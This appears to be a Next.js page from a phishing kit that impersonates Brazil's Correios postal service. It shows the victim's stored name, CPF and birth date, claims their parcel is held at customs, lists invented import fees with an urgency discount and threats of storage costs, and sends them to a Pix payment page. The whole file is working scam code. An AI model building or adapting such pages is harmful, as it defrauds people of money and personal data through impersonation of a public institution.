"use client"
import { Button } from "@/components/ui/button"
import {
  Menu,
  FileText,
  Phone,
  ShoppingCart,
  HelpCircle,
  Users,
  Building,
  GraduationCap,
  Shield,
  Search,
  Lock,
  ExternalLink,
} from "lucide-react"
import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"

interface CustomerData {
  nome?: string
  cpf?: string
  nascimento?: string
}

export default function PagamentoPage() {
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [customerData, setCustomerData] = useState<CustomerData>({})
  const [loading, setLoading] = useState(true)
  const [mounted, setMounted] = useState(false)
  const router = useRouter()

  useEffect(() => {
    setMounted(true)
  }, [])

  useEffect(() => {
    if (!mounted) return

    const loadCustomerData = () => {
      console.log("[v0] Loading customer data from localStorage")

      try {
        const storedData = localStorage.getItem("cpfData")
        console.log("[v0] Stored data:", storedData)

        if (storedData) {
          const parsedData = JSON.parse(storedData)
          console.log("[v0] Parsed data:", parsedData)

          const customerInfo = {
            nome: parsedData.nome || "Não informado",
            cpf: parsedData.cpf || "Não informado",
            nascimento: parsedData.nascimento || "Não informado",
          }

          console.log("[v0] Setting customer data:", customerInfo)
          setCustomerData(customerInfo)
        } else {
          console.log("[v0] No stored data found")
          setCustomerData({
            nome: "Não informado",
            cpf: "Não informado",
            nascimento: "Não informado",
          })
        }
      } catch (error) {
        console.error("[v0] Error loading customer data:", error)
        setCustomerData({
          nome: "Não informado",
          cpf: "Não informado",
          nascimento: "Não informado",
        })
      }

      setLoading(false)
    }

    loadCustomerData()
  }, [mounted])

  if (!mounted) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-blue-600 mx-auto"></div>
          <p className="mt-4 text-gray-600">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-100" style={{ fontFamily: "Verdana, sans-serif" }}>
      {/* Header */}
      <header style={{ backgroundColor: "#f5f3f0" }}>
        {/* Top section with accessibility and login */}
        <div className="flex items-center justify-between px-4 py-2">
          <div className="flex items-center gap-4">
            <button className="text-blue-600 text-sm">Acessibilidade ▼</button>
          </div>
        </div>

        <div className="h-px bg-white w-full"></div>

        {/* Main header section with logo and login button */}
        <div className="flex items-center justify-between px-4 py-3">
          {/* Mobile layout: hamburger left, logo center */}
          <div className="md:hidden flex items-center justify-between w-full">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
            <div className="w-6"></div> {/* Spacer for centering */}
          </div>

          {/* Desktop layout: hamburger and logo left, login right */}
          <div className="hidden md:flex items-center gap-4 flex-1">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
          </div>

          <div className="hidden md:flex items-center gap-2">
            <div className="bg-gray-300 mr-3 w-px h-[30px]"></div>
            <img src="/images/login-icon.png" alt="Entrar" className="h-8 w-[41px]" />
            <span className="text-[rgba(0,63,253,1)] font-light">Entrar</span>
          </div>
        </div>

        <div className="bg-yellow-400 w-full h-px"></div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-6">
        {/* Breadcrumb */}
        <nav className="flex items-center gap-2 mb-4 tracking-normal text-base">
          <span className="md:hidden">
            <a href="/" className="text-blue-600 hover:underline">
              {"<"}
            </a>
            <span className="text-black ml-1">Pagamento</span>
          </span>
          <div className="hidden md:flex items-center gap-2 text-blue-600">
            <a href="/" className="hover:underline">
              Portal Correios
            </a>
            <span className="text-foreground">›</span>
            <a href="/" className="hover:underline">
              Rastreamento
            </a>
            <span className="text-foreground">›</span>
            <span>Pagamento</span>
          </div>
        </nav>

        {/* Payment Content */}
        <div className="bg-white p-6 rounded-sm">
          {/* Header */}
          <div className="mb-6">
            <h1 className="text-2xl font-bold text-gray-900 mb-4">Taxas e Impostos — Encomenda Importada</h1>
          </div>

          {/* Alert Box */}
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
            <p className="text-red-700">
              <strong>Atenção:</strong> sua encomenda está retida na fiscalização aduaneira. Para prosseguir com o
              desembaraço, é necessário realizar o pagamento das taxas abaixo.
            </p>
          </div>

          {/* Warning Text */}
          <div className="mb-6 text-sm text-gray-700">
            <p className="mb-2">
              Sua mercadoria foi retida para conferência e cobrança de tributos e taxas de importação. O pagamento
              imediato das taxas listadas permite o desembaraço da encomenda. Caso não haja regularização, a encomenda
              permanecerá retida e poderão ser aplicados custos adicionais de armazenamento e procedimentos
              administrativos.
            </p>
          </div>

          {/* Payment Guide */}
          <div className="bg-gray-50 rounded-lg p-6 mb-6">
            <h2 className="font-bold text-lg mb-4">Guia de Pagamento</h2>

            <div className="space-y-3 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-700">Nome completo:</span>
                <span className={loading ? "text-gray-400" : "text-gray-900 font-medium"}>
                  {loading ? "Carregando..." : customerData.nome}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-700">CPF:</span>
                <span className={loading ? "text-gray-400" : "text-gray-900 font-medium"}>
                  {loading ? "Carregando..." : customerData.cpf}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-700">Data de nascimento:</span>
                <span className={loading ? "text-gray-400" : "text-gray-900 font-medium"}>
                  {loading ? "Carregando..." : customerData.nascimento}
                </span>
              </div>

              <hr className="my-4" />

              <div className="flex justify-between">
                <span className="text-gray-700">Taxa de Importação (estimada)</span>
                <span className="font-medium">R$ 65,00</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-700">Desembaraço Aduaneiro</span>
                <span className="font-medium">R$ 20,00</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-700">Encargos operacionais</span>
                <span className="font-medium">R$ 15,48</span>
              </div>

              <div className="flex justify-between text-gray-500">
                <span className="line-through">Subtotal</span>
                <span className="line-through">R$ 100,48</span>
              </div>

              <div className="flex justify-between text-green-600">
                <span>Desconto por antecipação</span>
                <span>-R$ 37,78</span>
              </div>

              <hr className="my-4" />

              <div className="flex justify-between text-lg font-bold">
                <span>Total a Pagar</span>
                <span>R$ 62,70</span>
              </div>
            </div>
          </div>

          {/* Terms Checkbox */}
          <div className="flex items-start gap-3 mb-6">
            <input
              type="checkbox"
              className="mt-1 w-4 h-4 text-blue-600"
              checked={termsAccepted}
              onChange={(e) => setTermsAccepted(e.target.checked)}
            />
            <p className="text-sm text-gray-600">
              Concordo com os termos e autorizo o pagamento para regularização e liberação da encomenda. Estou ciente de
              que a falta de pagamento implicará na permanência da mercadoria retida e em possíveis custos adicionais de
              armazenamento/recursos administrativos.
            </p>
          </div>

          {/* Payment Button */}
          <Button
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-6 text-sm md:text-lg"
            onClick={() => {
              if (termsAccepted) {
                router.push("/pix")
              } else {
                alert("Por favor, aceite os termos para continuar.")
              }
            }}
            disabled={!termsAccepted}
          >
            PAGAR TAXAS E LIBERAR ENCOMENDA
          </Button>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-yellow-400 text-black py-8 mt-12">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {/* Fale Conosco */}
            <div>
              <h3 className="font-bold mb-4 text-[rgba(0,64,105,1)] text-lg md:text-2xl">Fale Conosco</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(12,63,101,1)]" />
                  <span className="text-[rgba(0,65,104,1)] font-medium text-sm md:text-base">
                    Registro de Manifestações
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Phone className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Central de Atendimento
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <ShoppingCart className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Soluções para o seu negócio
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <HelpCircle className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Suporte ao cliente com contrato
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Users className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Ouvidoria</span>
                </li>
                <li className="flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Denúncia</span>
                </li>
              </ul>
            </div>

            {/* Sobre os Correios */}
            <div>
              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Sobre os Correios</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2">
                  <Building className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Identidade corporativa
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <GraduationCap className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Educação e cultura</span>
                </li>
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Código de ética</span>
                </li>
                <li className="flex items-center gap-2">
                  <Search className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Transparência e prestação de contas
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Lock className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Política de Privacidade e Notas Legais
                  </span>
                </li>
              </ul>
            </div>

            {/* Outros Sites */}
            <div>
              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Outros Sites</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2 text-[rgba(0,64,105,1)]">
                  <ExternalLink className="w-4 h-4" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Loja online dos Correios
                  </span>
                </li>
              </ul>
            </div>
          </div>

          <div className="text-center mt-8 pt-4 border-t border-yellow-500">
            <p className="text-sm">© Copyright 2025 Correios</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
